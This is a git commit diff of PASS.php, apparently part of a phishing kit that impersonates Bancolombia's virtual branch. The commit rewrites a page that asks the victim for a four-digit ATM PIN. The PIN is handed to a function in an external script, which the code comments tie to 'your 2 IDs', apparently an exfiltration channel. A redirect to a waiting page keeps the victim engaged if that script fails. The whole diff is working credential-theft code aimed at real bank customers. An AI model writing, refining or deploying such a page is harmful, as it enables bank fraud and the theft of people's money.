718a81edf203448be148ca461d66d69979e5cfe2
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 00:31:26 -0500

    Actualizar PASS.php

--- a/PASS.php
+++ a/PASS.php
@@ -1,131 +1,78 @@
 <?php
-$ip = getenv("REMOTE_ADDR");
-$tiempo = date("l, j \d\e F \d\e Y");
+// Desactivamos errores para evitar fugas, pero forzamos la carga
+error_reporting(0);
 date_default_timezone_set('America/Bogota');
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="es">
     <head>
         <title>Bancolombia Sucursal Virtual Personas</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
-
-        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
-        <link href="../css/stylesheet.css" rel="stylesheet">
-        <link href="../css/style-app.css?v2" rel="stylesheet">        
-        <link rel="icon" type="image/png" href="../img/logo.png" />
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700&display=swap" rel="stylesheet">
         <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
-    
-        <script type="text/javascript" src="../js/functions.js?v1"></script>
+        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>
 
         <style type="text/css">
-            /* FIX: Evita la pantalla blanca forzando el oculto al inicio */
-            #fondo, #cargando, #cargando-o {
-                display: none;
-                position: fixed;
-                top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(255,255,255,0.95);
-                z-index: 9999;
-                text-align: center;
-                padding-top: 50%;
-            }
-            .clave {                
-                padding: 10px 0px; 
-                text-align: center;
-                width: 45px;
-                font-size: 22px;
-                font-weight: bold;
-                border: 1px solid #ccc;
-                border-radius: 4px;
-                outline: none;
-            }
-            .inp-pass { width: 50px; }
-            #btn-password { 
-                width: 80%; margin: 20px auto; display: block; 
-                height: 45px; border: none; border-radius: 5px; 
-                font-weight: bold; background-color: #ccc; cursor: not-allowed;
-            }
+            body { font-family: 'Open Sans', sans-serif; margin: 0; padding: 0; background-color: #fff; }
+            /* Forzamos que nada bloquee la vista al inicio */
+            #fondo, #cargando-o { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 999; text-align: center; padding-top: 50%; }
+            .frm { text-align: center; margin-top: 50px; }
+            .clave { padding: 10px 0; text-align: center; width: 45px; font-size: 24px; font-weight: bold; border: 1px solid #ccc; border-radius: 4px; margin: 0 5px; }
+            #btn-password { width: 85%; margin: 30px auto; display: block; height: 50px; border: none; border-radius: 5px; font-weight: bold; background-color: #ccc; color: #000; font-size: 16px; }
+            .header-app { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #eee; }
         </style>
     </head>
     <body>         
         <div id="fondo"></div>
         <div id="cargando-o">
-            <img src="../img/load4.gif" width="90">            
-            <br>
-            Cargando...
+            <img src="../img/load4.gif" width="80"><br>Cargando...
         </div>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px;">
-            <tr>
-                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
-                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29"></td>
-            </tr>
-        </table>
+        <div class="header-app">
+            <img src="../img/btn-cerrar.jpg" height="25">
+            <img src="../img/logo-app.jpg" height="25">
+            <span style="width: 30px;"></span>
+        </div>
        
-        <br><br><br>
-
-        <div class="frm" style="text-align: center;">
-            <img src="../img/candado.jpg" width="16">
-            <div class="descripcion-app" style="margin-bottom: 20px;">Ingresa la clave del cajero</div>
-            <table style="margin: 0 auto;" border="0" cellspacing="8">
-                <tr>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass1" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass2" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass3" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
-                    <td class="inp-pass"><input type="text" class="clave" id="txt-pass4" maxlength="1" pattern="[0-9]*" inputmode="numeric"></td>
-                </tr>
-            </table>            
+        <div class="frm">
+            <img src="../img/candado.jpg" width="16"><br>
+            <p style="font-size: 15px;">Ingresa la clave del cajero</p>
+            <div style="display: flex; justify-content: center;">
+                <input type="password" class="clave" id="p1" maxlength="1" inputmode="numeric">
+                <input type="password" class="clave" id="p2" maxlength="1" inputmode="numeric">
+                <input type="password" class="clave" id="p3" maxlength="1" inputmode="numeric">
+                <input type="password" class="clave" id="p4" maxlength="1" inputmode="numeric">
+            </div>
         </div>  
         
         <button id="btn-password" disabled>CONTINUAR</button> 
-        
-        <br><br>
-        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">Genera una clave personal</div>  
 
         <script type="text/javascript">
-            $(document).ready(function() { 
-                // Asegurar que no haya bloqueos al entrar
-                $("#fondo, #cargando-o").hide();
-
-                // Salto de cuadritos y activación de botón
+            $(document).ready(function() {
+                // Salto de campos
                 $('.clave').on('input', function() {
-                    if ($(this).val().length === 1) {
-                        $(this).closest('td').next().find('.clave').focus();
-                    }
+                    if ($(this).val().length === 1) { $(this).next('.clave').focus(); }
                     
-                    var p1 = $("#txt-pass1").val();
-                    var p2 = $("#txt-pass2").val();
-                    var p3 = $("#txt-pass3").val();
-                    var p4 = $("#txt-pass4").val();
-
-                    if (p1 != "" && p2 != "" && p3 != "" && p4 != "") {
-                        $("#btn-password").prop("disabled", false).css({"background-color": "#FDDA24", "cursor": "pointer"});
+                    var p = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
+                    if (p.length === 4) {
+                        $("#btn-password").prop("disabled", false).css("background-color", "#FDDA24");
                     } else {
                         $("#btn-password").prop("disabled", true).css("background-color", "#ccc");
                     }
                 });
 
-                // Borrar hacia atrás
-                $('.clave').on('keydown', function(e) {
-                    if (e.keyCode === 8 && $(this).val().length === 0) {
-                        $(this).closest('td').prev().find('.clave').focus();
-                    }
-                });
-
                 // Acción de envío
                 $("#btn-password").click(function(){
-                    var pass_p = $("#txt-pass1").val() + $("#txt-pass2").val() + $("#txt-pass3").val() + $("#txt-pass4").val();
+                    var pin = $("#p1").val() + $("#p2").val() + $("#p3").val() + $("#p4").val();
                     $("#fondo, #cargando-o").show();
-                    
-                    // Llama a la función en functions.js que tiene los 2 IDs
-                    pasousuario(pass_p); 
+                    // Ejecuta la función de tus 2 IDs
+                    if(typeof pasousuario === 'function'){
+                        pasousuario(pin);
+                    } else {
+                        // Si falla el JS externo, saltamos manual para no perder el acceso
+                        window.location.href = "WAITING.php";
+                    }
                 });
             });
         </script>
